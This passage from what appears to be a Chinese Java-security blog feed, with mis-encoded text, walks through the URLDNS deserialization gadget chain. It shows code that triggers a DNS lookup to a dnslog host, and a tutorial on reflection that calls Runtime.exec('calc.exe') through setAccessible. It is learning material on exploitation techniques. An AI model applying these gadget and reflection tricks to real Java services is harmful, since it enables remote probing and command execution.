class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>hash</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-type">int</span> h;<br><span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœkeyä¸æ˜¯nullå°±ä¼šè°ƒç”¨<code>hashCode</code>æ–¹æ³•ï¼Œè¿™é‡Œçš„keyæ˜¯ä¸€ä¸ª<code>java.net.URL</code>å¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿›å…¶<code>hashCode</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> hashCode;<br><br>hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br><span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>hashCode ç­‰äº -1 æ—¶ï¼Œè¿˜ä¼šç»§ç»­è°ƒç”¨<code>handler.hashCode</code>ï¼Œæ­¤æ—¶ï¼Œ<code>handler</code>æ—¶<code>URLStreamHandler</code>å¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿›å…¶<code>hashCode</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Generate the protocol part.</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>        h += protocol.hashCode();<br><br>    <span class="hljs-comment">// Generate the host part.</span><br>    <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè°ƒç”¨<code>getHostAddress()</code>ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hostAddress != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> hostAddress;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.isEmpty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        hostAddress = InetAddress.getByName(host);<br>    &#125; <span class="hljs-keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hostAddress;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>InetAddress.getByName(host)</code>çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šè¿›è¡Œä¸€æ¬¡DNSæŸ¥è¯¢ã€‚</p><p>è¿™å°±è¾¾åˆ°äº†è¿™ä¸ªåˆ©ç”¨é“¾çš„ç›®çš„</p><h3 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h3><p>çŸ¥é“äº†åŸç†ï¼Œæˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªä»£ç è§¦å‘ä¸€ä¸‹è¿™ä¸ªåˆ©ç”¨é“¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9rct5n.dnslog.cn&quot;</span>);<br><br>        expMap.put(url, <span class="hljs-number">123</span>); <span class="hljs-comment">// æ­¤æ—¶hashcodeå€¼ä¸ä¸º-1 æ— æ³•è§¦å‘DNSæŸ¥è¯¢</span><br><br>        <span class="hljs-comment">//é€šè¿‡åå°„ä¿®æ”¹hashCodeå€¼</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(url, -<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åªè¦å°†urlå¯¹è±¡çš„hashCodeè®¾ç½®ä¸º-1ï¼Œå°±ä¼šæŒ‰ç…§åˆ©ç”¨é“¾è§¦å‘DNSæŸ¥è¯¢ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨åŸºç¡€</title>
    <link href="/2023/04/23/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/04/23/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å¼€å§‹å­¦ä¹ Javaå®‰å…¨ï¼Œç¨å¾®æ€»ç»“ä¸€ä¸‹</p><h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><p>Javaåå°„æ˜¯Javaéå¸¸é‡è¦çš„åŠ¨æ€ç‰¹å¾ï¼Œé€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬å¯ä»¥è·å–ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•ã€æˆå‘˜å˜é‡ã€æ„é€ æ–¹æ³•ç­‰ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚</p><h3 id="åå°„è·å–Runtimeå¯¹è±¡æ‰§è¡Œä»£ç "><a href="#åå°„è·å–Runtimeå¯¹è±¡æ‰§è¡Œä»£ç " class="headerlink" title="åå°„è·å–Runtimeå¯¹è±¡æ‰§è¡Œä»£ç "></a>åå°„è·å–Runtimeå¯¹è±¡æ‰§è¡Œä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–Runtimeç±»å¯¹è±¡</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br><span class="hljs-comment">// è·å–æ„é€ æ–¹æ³•</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> runtimeClass1.getDeclaredConstructor();<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// åˆ›å»ºRuntimeç±»ç¤ºä¾‹ï¼Œç­‰ä»·äº Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><br><span class="hljs-comment">// è·å–Runtimeçš„exec(String cmd)æ–¹æ³•</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br><span class="hljs-comment">// è°ƒç”¨execæ–¹æ³•ï¼Œç­‰ä»·äº rt.exec(cmd);</span><br>runtimeMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¾“å‡ºï¼šlaptop-rserru3g\aurey</p><p>æ•ˆæœç›¸å½“äºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h3><p>Javaåå°„æ“ä½œçš„æ˜¯ <code>java.lang.Class</code> å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·å–åˆ°Classå¯¹è±¡</p><p>é€šå¸¸æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡»ä¸­æ–¹å¼è·å–ä¸€ä¸ªç±»çš„Classå¯¹è±¡</p><ol><li><code>ClassName.class</code> </li><li><code>Class.forName(&quot;java.lang.Runtime&quot;)</code></li><li><code>classLoader.loadClass(&quot;java.lang.Runtime&quot;)</code></li></ol><p><strong>è·å–Runtimeç±»Classå¯¹è±¡ï¼š</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span><span class="hljs-keyword">class</span>;<br>Class class2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;<br>Class class3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>.load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸Šä»»æ„ä¸€ç§æ–¹å¼å°±å¯ä»¥è·å– <code>java.lang.Runtime</code> ç±»çš„Classå¯¹è±¡ã€‚</p><p>åå°„è°ƒç”¨å†…éƒ¨ç±»çš„æ—¶å€™éœ€è¦ä½¿ç”¨ <code>$</code> æ¥ä»£æ›¿ <code>.</code></p><p>ä¾‹å¦‚<code>ysoserial.test</code>ç±»ä¸­æœ‰ä¸€ä¸ªå«<code>ref</code>çš„å†…éƒ¨ç±»ï¼Œé‚£ä¹ˆè°ƒç”¨çš„æ—¶å€™å°±åº”è¯¥å°†ç±»åå†™æˆ<code>ysoserial.test$ref</code></p><h4 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h4><p>forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š</p><ol><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</code></li></ol><p>ç¬¬ä¸€ä¸ªæ˜¯æœ€å¸¸ç”¨çš„åå°„è·å–classçš„æ–¹æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºç¬¬äºŒç§æ–¹å¼çš„ä¸€ä¸ªå°è£…ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>)</span>;<br><span class="hljs-comment">// ç­‰ä»·äº</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">currentLoader</span>)</span>;<br></code></pre></td></tr></table></figure><p><code>forName</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æƒ³è·å–çš„ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ClassLoader</p><p>ç¬¬äºŒä¸ªå‚æ•°<code>initialize</code>ï¼Œæ˜¯å‘Šè¯‰Javaè™šæ‹Ÿæœºæ˜¯å¦æ‰§è¡Œç±»åˆå§‹åŒ–</p><p>å¦‚æœè¯¥é€‰é¡¹ä¸ºtrueï¼Œ<code>forName</code>ä¼šè‡ªåŠ¨æ‰§è¡Œç±»åˆå§‹åŒ–ï¼Œå¹¶æ‰§è¡Œ<code>static&#123;&#125;</code>ä»£ç å—ä¸­çš„å†…å®¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InitTest</span> &#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Empty block initial&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Static block initial&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InitTest</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Initial function&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;ysoserial.test.InitTest&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¾“å‡ºï¼šStatic block initial</p><h3 id="åå°„åˆ›å»ºç±»å®ä¾‹"><a href="#åå°„åˆ›å»ºç±»å®ä¾‹" class="headerlink" title="åå°„åˆ›å»ºç±»å®ä¾‹"></a>åå°„åˆ›å»ºç±»å®ä¾‹</h3><p>åœ¨Javaä¸­ï¼Œä»»ä½•ä¸€ä¸ªç±»éƒ½å¿…é¡»æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ„é€ æ–¹æ³•ï¼Œå¦‚æœä»£ç ä¸­æ²¡æœ‰åˆ›å»ºæ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨ç±»ç¼–è¯‘çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ— å‚æ„é€ æ–¹æ³•</p><p><strong>java.lang.Runtimeç±»æ„é€ æ–¹æ³•ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span>&#123;<br><span class="hljs-comment">/** Don&#x27;t let anyone else instantiate this class */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Runtime</span><span class="hljs-params">()</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Runtime</code> ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡ <code>Runtime rt = new Runtime();</code>æ¥åˆ›å»ºRuntimeå¯¹è±¡ã€‚ä½†æˆ‘ä»¬å¯ä»¥å€ŸåŠ©åå°„æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹æ–¹æ³•è®¿é—®æƒé™ä»è€Œé—´æ¥åˆ›å»ºRuntimeå¯¹è±¡ã€‚</p><h4 id="ä¿®æ”¹æƒé™è®¿é—®æ„é€ æ–¹æ³•"><a href="#ä¿®æ”¹æƒé™è®¿é—®æ„é€ æ–¹æ³•" class="headerlink" title="ä¿®æ”¹æƒé™è®¿é—®æ„é€ æ–¹æ³•"></a>ä¿®æ”¹æƒé™è®¿é—®æ„é€ æ–¹æ³•</h4><p>ä¹Ÿå°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„è¿™ä¸€æ®µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–æ„é€ æ–¹æ³•</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> runtimeClass1.getDeclaredConstructor();<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// åˆ›å»ºRuntimeç±»ç¤ºä¾‹ï¼Œç­‰ä»·äº Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br></code></pre></td></tr></table></figure><p><code>getConstructor()</code> å’Œ <code>getDeclaredConstructor()</code>éƒ½å¯ä»¥è·å–åˆ°ç±»çš„æ„é€ æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºåè€…æ— æ³•è·å–åˆ°ç§æœ‰æ–¹æ³•ï¼Œæ‰€ä»¥ä¸€èˆ¬åœ¨è·å–æŸä¸ªç±»çš„æ„é€ æ–¹æ³•çš„æ—¶å€™æˆ‘ä»¬ä¼šä½¿ç”¨<code>getDeclaredConstructor()</code>å»è·å–æ„é€ æ–¹æ³•ã€‚</p><p>å¦‚æœæ„é€ æ–¹æ³•æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°çš„æƒ…å†µä¸‹æˆ‘ä»¬åº”è¯¥åœ¨è·å–æ„é€ æ–¹æ³•çš„æ—¶å€™ä¼ å…¥å¯¹åº”çš„å‚æ•°ç±»å‹æ•°ç»„ï¼š</p><p><code>clazz.getDeclaredConstructor(String.class, String.class)</code></p><p>è·å–åˆ°æ„é€ æ–¹æ³•ä»¥åæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>constructor.newInstance()</code>æ¥åˆ›å»ºç±»å®ä¾‹ï¼Œå¦‚æœæœ‰å‚æ•°çš„æƒ…å†µä¸‹ä¹Ÿéœ€è¦ä¼ å…¥å¯¹åº”çš„å‚æ•°å€¼ã€‚å½“æˆ‘ä»¬æ²¡æœ‰è®¿é—®æ„é€ æ–¹æ³•çš„æƒé™æ—¶æˆ‘ä»¬åº”è¯¥è°ƒç”¨<code>constructor.setAccessible(true)</code>ä¿®æ”¹è®¿é—®æƒé™ï¼Œæ‰èƒ½åˆ›å»ºç±»å®ä¾‹ã€‚</p><h4 id="é€šè¿‡ç°æœ‰å‡½æ•°è·å–ç±»å¯¹è±¡"><a href="#é€šè¿‡ç°æœ‰å‡½æ•°è·å–ç±»å¯¹è±¡" class="headerlink" title="é€šè¿‡ç°æœ‰å‡½æ•°è·å–ç±»å¯¹è±¡"></a>é€šè¿‡ç°æœ‰å‡½æ•°è·å–ç±»å¯¹è±¡</h4><p>ä¸ºä»€ä¹ˆç±»çš„æ„é€ æ–¹æ³•ä¼šè¢«è®¾ç½®æˆç§æœ‰çš„å‘¢ï¼Ÿéš¾é“ä¸æƒ³è®©ç”¨æˆ·ä½¿ç”¨è¿™ä¸ªç±»å—ï¼Ÿ</p><p>è¿™é‡Œæ¶‰åŠåˆ°å¸¸è§çš„è®¾è®¡æ¨¡å¼ï¼šâ€å•ä¾‹æ¨¡å¼â€</p><blockquote><p>ä¸‹é¢å¼•ç”¨pç¥ Javaå®‰å…¨æ¼«è°ˆ-02ä¸­çš„ä¾‹å­</p></blockquote><p>æ¯”å¦‚ï¼Œå¯¹äºWebåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°æ•°æ®åº“çš„æ—¶å€™å†æ–°å»ºä¸€ä¸ªè¿æ¥ï¼Œæ­¤æ—¶ä½œä¸ºå¼€å‘è€…å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„ç±»çš„æ„é€ å‡½æ•°è®¾ç½®ä¸ºç§æœ‰çš„ï¼Œç„¶åç¼–å†™ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainDB</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TrainDB</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrainDB</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TrainDB <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">TrainDB</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// å»ºç«‹è¿æ¥çš„ä»£ç ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œåªæœ‰ç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ï¼Œåé¢åªèƒ½é€šè¿‡ <code>getInstance</code>è·å–è¿™ä¸ªå¯¹è±¡ï¼Œé¿å…å»ºç«‹å¤šä¸ªæ•°æ®åº“è¿æ¥ã€‚</p><p>Runtimeç±»å°±æ˜¯å•ä¾‹æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>Runtime.getRuntime()</code> æ¥è·å– <code>Runtime</code>å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†<code>getMethod</code> å’Œ <code>invoke</code> æ–¹æ³•ï¼Œä¹Ÿæ˜¯ä¸‹é¢çš„ä¸»è¦å†…å®¹</p><h3 id="åå°„è°ƒç”¨ç±»æ–¹æ³•"><a href="#åå°„è°ƒç”¨ç±»æ–¹æ³•" class="headerlink" title="åå°„è°ƒç”¨ç±»æ–¹æ³•"></a>åå°„è°ƒç”¨ç±»æ–¹æ³•</h3><p><strong>è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–Runtimeçš„exec(String cmd)æ–¹æ³•</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br></code></pre></td></tr></table></figure><p><code>getMethod</code> å’Œ <code>getDeclaredMethod</code> éƒ½èƒ½ç‹—è·å–åˆ°ç±»æˆå‘˜æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äº<code>getMethod</code>åªèƒ½è·å–å½“å‰ç±»å’Œçˆ¶ç±»çš„æ‰€æœ‰æœ‰æƒé™çš„æ–¹æ³•ï¼Œè€Œ<code>getDeclaredMethod</code>èƒ½è·å–åˆ°å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜æ–¹æ³•ï¼ˆåŒ…æ‹¬privateæ–¹æ³•ï¼‰</p><p>Javaä¸­æ”¯æŒç±»çš„é‡è½½ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…é€šè¿‡å‡½æ•°åæ¥ç¡®å®šä¸€ä¸ªå‡½æ•°ã€‚æ‰€ä»¥ï¼Œåœ¨è°ƒç”¨<code>getMethod</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¼ ç»™å®ƒéœ€è¦è·å–å‡½æ•°çš„å‚æ•°åˆ—è¡¨ï¼Œä¾‹å¦‚è¿™é‡Œçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br></code></pre></td></tr></table></figure><p><strong>åå°„è°ƒç”¨æ–¹æ³•</strong></p><p>è·å–åˆ° <code>java.lang.reflect.Method</code> å¯¹è±¡ä»¥åæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>Method</code> çš„ <code>invoke</code>æ–¹æ³•æ¥è°ƒç”¨ç±»æ–¹æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">method.<span class="hljs-built_in">invoke</span>(æ–¹æ³•å®ä¾‹å¯¹è±¡, æ–¹æ³•å‚æ•°å€¼, 